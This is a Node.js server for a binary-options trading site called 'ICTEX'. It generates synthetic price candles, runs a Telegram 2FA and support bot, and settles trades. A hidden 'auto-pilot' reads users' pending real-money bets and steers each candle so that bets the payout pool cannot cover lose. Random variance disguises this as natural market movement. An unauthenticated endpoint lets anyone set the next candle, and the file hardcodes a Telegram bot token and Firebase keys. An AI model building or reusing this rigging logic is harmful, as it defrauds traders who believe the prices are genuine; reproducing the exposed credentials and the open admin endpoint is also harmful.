// --- START: main app server.js (v30.3 - Quotex Style Candles & Exact 60s Sync) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 250; // Faster tick for smoother movement
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000;

// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
const SMART_AUTO_PILOT = true; 
const ADMIN_WIN_RATIO = 0.80;  

// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
const POOL_CONFIG = {
    ADMIN_SHARE: 0.70,
    USER_SHARE: 0.30  
};
let globalPayoutPool = 0;
let globalAdminProfit = 0;

const markets = {}; 
const activeTradesDb = {}; 

db.ref('admin/revenue_pool').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    globalPayoutPool = parseFloat(data.payoutPool) || 0;
    globalAdminProfit = parseFloat(data.adminProfit) || 0;
});

function updateGlobalPoolInDB(payoutChange, adminChange) {
    globalPayoutPool += payoutChange;
    globalAdminProfit += adminChange;
    if (globalPayoutPool < 0) globalPayoutPool = 0;
    db.ref('admin/revenue_pool').update({
        payoutPool: globalPayoutPool,
        adminProfit: globalAdminProfit
    }).catch(err => console.error("Pool Update Error:", err));
}

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        activeTradesDb[marketId] = nodeData.activeTrades || {};
        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 1. Natural Market Generation (QUOTEX STYLE: Small bodies, long wicks, choppy)
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    
    // Very low base volatility to keep bodies small like Quotex
    const baseVol = safeOpen * 0.000045; 
    
    let body, upperWick, lowerWick;
    const rand = Math.random();

    if (rand < 0.45) {
        // 45% Chance: Doji / Spinning Top (Very small body, visible wicks)
        body = baseVol * (Math.random() * 0.3); 
        upperWick = baseVol * (0.8 + Math.random() * 2);
        lowerWick = baseVol * (0.8 + Math.random() * 2);
    } 
    else if (rand < 0.75) {
        // 30% Chance: Hammer / Shooting Star (Small body, one long wick)
        body = baseVol * (0.4 + Math.random() * 0.8);
        if (Math.random() > 0.5) {
            upperWick = baseVol * (2 + Math.random() * 2.5);
            lowerWick = baseVol * (Math.random() * 0.4);
        } else {
            upperWick = baseVol * (Math.random() * 0.4);
            lowerWick = baseVol * (2 + Math.random() * 2.5);
        }
    } 
    else if (rand < 0.96) {
        // 21% Chance: Normal OTC Candle (Medium small body, standard wicks)
        body = baseVol * (1.0 + Math.random() * 1.5);
        upperWick = baseVol * (0.3 + Math.random() * 1.2);
        lowerWick = baseVol * (0.3 + Math.random() * 1.2);
    } 
    else {
        // 4% Chance: Slightly larger body (But not insanely huge)
        body = baseVol * (2.5 + Math.random() * 1.5);
        upperWick = baseVol * (Math.random() * 0.3);
        lowerWick = baseVol * (Math.random() * 0.3);
    }

    const close = isGreen ? safeOpen + body : safeOpen - body;
    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) {
        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
    }

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. Exact Pattern Generator
function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) {
    let bodySize, upperWick, lowerWick, close, high, low;
    const volatility = open * 0.00005; // Reduced to match Quotex style

    switch (command) {
        case 'GREEN': 
            bodySize = volatility * 1.5; close = open + bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
        case 'RED': 
            bodySize = volatility * 1.5; close = open - bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = volatility * 3.5; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = volatility * 3.5; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'DOJI': 
            bodySize = open * 0.000001; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'GREEN_HAMMER': 
            bodySize = volatility * 0.5; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'RED_HAMMER': 
            bodySize = volatility * 0.5; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        default: 
            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
    }
    
    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
        isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, lastCandle, marketData.nextCandleCloneData);
            newCandle.isAdminCommand = true; 
            marketData.nextCandleCommand = null;
            marketData.nextCandleCloneData = null;
        } 
        
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let immediateUpPayout = 0, immediateDownPayout = 0;
            const nextPeriod = currentPeriod + TIMEFRAME;
            
            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true; 
                const payoutRate = t.payoutRate || 1.85;
                const expectedPayout = t.amount * payoutRate;

                if (!isDemo && !t.isProcessedForPool) {
                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                    updateGlobalPoolInDB(userCut, adminCut);
                    t.isProcessedForPool = true;
                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                }

                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
                    if (t.direction === 'UP' && !isDemo) immediateUpPayout += expectedPayout;
                    if (t.direction === 'DOWN' && !isDemo) immediateDownPayout += expectedPayout;
                }
            });

            if (immediateUpPayout > 0 || immediateDownPayout > 0) {
                let targetDirection = 'DOJI';
                const canAffordUp = immediateUpPayout <= globalPayoutPool;
                const canAffordDown = immediateDownPayout <= globalPayoutPool;

                if (!canAffordUp && !canAffordDown) targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
                else if (!canAffordUp) targetDirection = 'RED';
                else if (!canAffordDown) targetDirection = 'GREEN';
                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';

                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection, lastCandle);
                newCandle.isAdminCommand = false; 
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00002); // Small variance
                
                let payoutChange = 0;
                let adminProfitChange = 0;

                if (targetDirection === 'GREEN') {
                    payoutChange = -immediateUpPayout;
                } else if (targetDirection === 'RED') {
                    payoutChange = -immediateDownPayout;
                } 

                if (payoutChange !== 0 || adminProfitChange !== 0) {
                    updateGlobalPoolInDB(payoutChange, adminProfitChange);
                }
            } 
        }
        
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    if (!candle.waypoints) {
        candle.waypoints = [];
        const numWaypoints = 15; // More waypoints = more choppy/realistic movement
        for (let i = 0; i < numWaypoints; i++) {
            if (i === 0) candle.waypoints.push(candle.open);
            else if (i === numWaypoints - 1) candle.waypoints.push(candle.targetClose);
            else {
                let wp = candle.targetLow + Math.random() * (candle.targetHigh - candle.targetLow);
                // Bias slightly towards center so wicks are left behind
                wp = (wp + candle.open + candle.targetClose) / 3; 
                candle.waypoints.push(wp);
            }
        }
        // Force high/low extremes somewhere in the middle
        candle.waypoints[3] = candle.targetHigh;
        candle.waypoints[10] = candle.targetLow;
    }

    const numWaypoints = candle.waypoints.length;
    const currentWaypointIndex = Math.min(Math.floor(progress * (numWaypoints - 1)), numWaypoints - 2);
    const waypointProgress = (progress * (numWaypoints - 1)) - currentWaypointIndex;

    const smoothStep = waypointProgress * waypointProgress * (3 - 2 * waypointProgress);
    const startWp = candle.waypoints[currentWaypointIndex];
    const endWp = candle.waypoints[currentWaypointIndex + 1];
    
    let idealPrice = startWp + (endWp - startWp) * smoothStep;
    const volatility = candle.open * 0.000015; // Micro volatility for ticks
    const noise = (Math.random() - 0.5) * volatility;

    marketData.currentPrice = idealPrice + noise;
    
    // 🔥 58 SEC BUG FIX: Only lock the price exactly 200ms before close (was 1500ms before)
    if (timeElapsed >= TIMEFRAME - 200) {
        marketData.currentPrice = candle.targetClose;
    } else {
        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    // Send exact server time to keep clients in strict 60s sync
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300), serverTime: Date.now() }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/command', (req, res) => {
    const { marketId, command, cloneData } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        if (cloneData) markets[marketId].nextCandleCloneData = cloneData;
        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
        res.json({ success: true, message: `Command ${command} received` });
    } else {
        res.status(404).json({ error: 'Market not found on server' });
    }
});

// Main Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    // Using strict 60000ms grid
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);


// ==========================================
// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥 (Unchanged)
// ==========================================
const https = require('https');
const TELEGRAM_BOT_TOKEN = "8740566281:AAF7MUaumUIrO7IJ7Hr93kG0EzOOHvr444U";
let lastUpdateId = 0;

function sendTelegramMessage(chatId, text) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });
        const req = https.request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (data.ok && data.result) resolve(data.result.message_id);
                    else resolve(null);
                } catch (e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.write(payload);
        req.end();
    });
}
function deleteTelegramMessage(chatId, messageId) {
    if (!messageId) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
    const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
    const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }});
    req.on('error', () => {}); req.write(payload); req.end();
}
const activeLinkingSessions = {};
const activeSupportSessions = {};
const adminSupportMap = {}; 
const ADMIN_OWNER_ID = "7504616242"; 

function forwardTelegramMessage(toChatId, fromChatId, messageId) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/forwardMessage`;
        const payload = JSON.stringify({ chat_id: toChatId, from_chat_id: fromChatId, message_id: messageId });
        const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } }, (res) => {
            let body = ''; res.on('data', chunk => body += chunk);
            res.on('end', () => { try { const data = JSON.parse(body); resolve(data.ok && data.result ? data.result.message_id : null); } catch (e) { resolve(null); } });
        });
        req.on('error', () => resolve(null)); req.write(payload); req.end();
    });
}

function pollTelegramUpdates() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
    const req = https.get(url, (res) => {
        let body = ''; res.on('data', chunk => body += chunk);
        res.on('end', async () => {
            try {
                const response = JSON.parse(body);
                if (response.ok && response.result.length > 0) {
                    for (const update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message) {
                            const msgDate = update.message.date || 0;
                            const nowSec = Math.floor(Date.now() / 1000);
                            if (msgDate < nowSec - 60) continue;

                            const text = update.message.text ? update.message.text.trim() : "";
                            const chatId = String(update.message.chat.id);
                            const textLower = text.toLowerCase();
                            
                            if (chatId === ADMIN_OWNER_ID && update.message.reply_to_message) {
                                const replyToId = update.message.reply_to_message.message_id;
                                const targetUserId = adminSupportMap[replyToId];
                                if (targetUserId && text) await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
                                continue;
                            }

                            if (textLower === '/start') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\nPlease end the active session first using /endhelp.`); continue; }
                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot.\n\n*Available Commands:*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View linked profiles.\n💬 /help - Open a direct support session.`);
                            } 
                            else if (textLower === '/linkictex') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ Please end the active help session first using /endhelp.`); continue; }
                                if (activeLinkingSessions[chatId]) {
                                    clearTimeout(activeLinkingSessions[chatId].timeoutRef);
                                    if (activeLinkingSessions[chatId].linkMessageId) deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
                                }
                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\``);
                                activeLinkingSessions[chatId] = {
                                    linkMessageId: linkMessageId,
                                    expiresAt: Date.now() + 60000,
                                    timeoutRef: setTimeout(async () => {
                                        if (linkMessageId) deleteTelegramMessage(chatId, linkMessageId);
                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\nYour 1-minute account linking session has expired. Type /linkictex to start again.`);
                                        setTimeout(() => { if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000);
                                        delete activeLinkingSessions[chatId];
                                    }, 60000)
                                };
                            }
                            else if (textLower === '/help') {
                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ You are already in an active support session.`); continue; }
                                activeSupportSessions[chatId] = { active: true, isFirstMessage: true };
                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\nYou are now connected to the Support Desk. Please describe your problem in detail.\n\n🔒 _Tap /endhelp to close the session._`);
                            }
                            else if (textLower === '/endhelp' || textLower === '/end') {
                                if (activeSupportSessions[chatId]) {
                                    delete activeSupportSessions[chatId];
                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*`);
                                }
                            }
                            else {
                                if (activeSupportSessions[chatId] && activeSupportSessions[chatId].active) {
                                    if (activeSupportSessions[chatId].isFirstMessage) {
                                        activeSupportSessions[chatId].isFirstMessage = false;
                                        await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
                                    }
                                    const forwardedId = await forwardTelegramMessage(ADMIN_OWNER_ID, chatId, update.message.message_id);
                                    if (forwardedId) adminSupportMap[forwardedId] = chatId;
                                }
                                else {
                                    const session = activeLinkingSessions[chatId];
                                    if (session && Date.now() < session.expiresAt) {
                                        const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
                                        if (codeMatch) {
                                            const linkCode = codeMatch[0].toUpperCase();
                                            const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                            if (linkSnap.exists()) {
                                                const uid = linkSnap.val().uid;
                                                await db.ref(`users/${uid}`).update({ telegramChatId: chatId, twoFactorEnabled: true });
                                                await linkSnap.ref.remove();
                                                clearTimeout(session.timeoutRef);
                                                if (session.linkMessageId) deleteTelegramMessage(chatId, session.linkMessageId);
                                                delete activeLinkingSessions[chatId];
                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\nYour Telegram profile is now fully bound to your ICTEX Trading Account.`);
                                            } else {
                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED*\nThe linking code is invalid or expired.`);
                                            }
                                        } 
                                    } 
                                }
                            }
                        }
                    }
                }
            } catch(e) {}
            setTimeout(pollTelegramUpdates, 1000); 
        });
    }).on('error', () => { setTimeout(pollTelegramUpdates, 3000); });
}

function deleteTelegramWebhook() {
    https.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`, (res) => {
        res.resume(); pollTelegramUpdates();
    }).on('error', () => { pollTelegramUpdates(); });
}
deleteTelegramWebhook();

const activeOtps = {};
async function handleNewOtp(uid, chatId, otp, userName) {
    if (activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        delete activeOtps[uid];
    }
    const otpMessageId = await sendTelegramMessage(chatId, `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\nYour code is: \`${otp.code}\`\n\n_Expires in 60s._`);
    activeOtps[uid] = { code: otp.code, chatId, otpMessageId, expiresAt: otp.expiresAt, timeoutRef: setTimeout(async () => {
        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ Code expired.`);
        setTimeout(() => { if (otpMessageId) deleteTelegramMessage(chatId, otpMessageId); if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000); 
        db.ref(`users/${uid}/pendingOTP`).remove().catch(() => {});
        delete activeOtps[uid];
    }, 60000) };
}
db.ref('users').on('child_changed', (snap) => {
    const user = snap.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        if (!activeOtps[snap.key] || activeOtps[snap.key].code !== user.pendingOTP.code) handleNewOtp(snap.key, user.telegramChatId, user.pendingOTP, user.name || 'User');
    } else if (user && !user.pendingOTP && activeOtps[snap.key]) {
        if (activeOtps[snap.key].timeoutRef) clearTimeout(activeOtps[snap.key].timeoutRef);
        if (activeOtps[snap.key].otpMessageId) deleteTelegramMessage(activeOtps[snap.key].chatId, activeOtps[snap.key].otpMessageId);
        delete activeOtps[snap.key];
    }
});

// ==========================================
// 🔥 ULTIMATE ARBITER: Trade Resolution Engine 🔥
// ==========================================
setInterval(async () => {
    const now = Date.now();
    const allMarketUpdates = {};

    for (const marketId in markets) {
        const marketData = markets[marketId];
        const trades = activeTradesDb[marketId] || {};

        for (const tradeId in trades) {
            const trade = trades[tradeId];

            if (trade.expiryTimestamp && now >= trade.expiryTimestamp && now < trade.expiryTimestamp + 60000) {
                
                const historyCheckSnap = await db.ref(`users/${trade.uid}/tradeHistory/${trade.id}`).once('value');
                if (historyCheckSnap.exists()) {
                    if (!allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`]) allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                    if (!allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`]) allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
                    continue;
                }

                let closingPrice = marketData.currentPrice;
                if (closingPrice === null || typeof closingPrice !== 'number') continue;

                let result, payout, profitChange;
                const betAmount = parseFloat(trade.amount);
                const openPrice = parseFloat(trade.openPrice);
                const payoutRate = parseFloat(trade.payoutRate) || 1.85;

                const priceDifference = closingPrice - openPrice;
                const pricePrecision = MIN_PRICE / 10;

                if (Math.abs(priceDifference) < pricePrecision) {
                    result = 'push';
                    payout = betAmount;
                    profitChange = 0;
                } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
                    result = 'win';
                    payout = betAmount * payoutRate;
                    profitChange = payout - betAmount;
                } else {
                    result = 'loss';
                    payout = 0;
                    profitChange = -betAmount;
                }
                
                const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
                allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
                allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };

                if (!trade.isDemo && !trade.isTournament) {
                    if (result === 'win') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(payout);
                    } else if (result === 'push') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(trade.realAmount);
                        allMarketUpdates[`users/${trade.uid}/bonusBalance`] = firebase.database.ServerValue.increment(trade.bonusAmount);
                    }
                    allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
                    allMarketUpdates[`users/${trade.uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
                }

                allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
            }
        }
    }

    if (Object.keys(allMarketUpdates).length > 0) {
        db.ref().update(allMarketUpdates).catch(()=>{});
    }
}, 2000);

app.get('/ping', (_req, res) => res.send('Server V30.3 - Quotex Style Candles Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));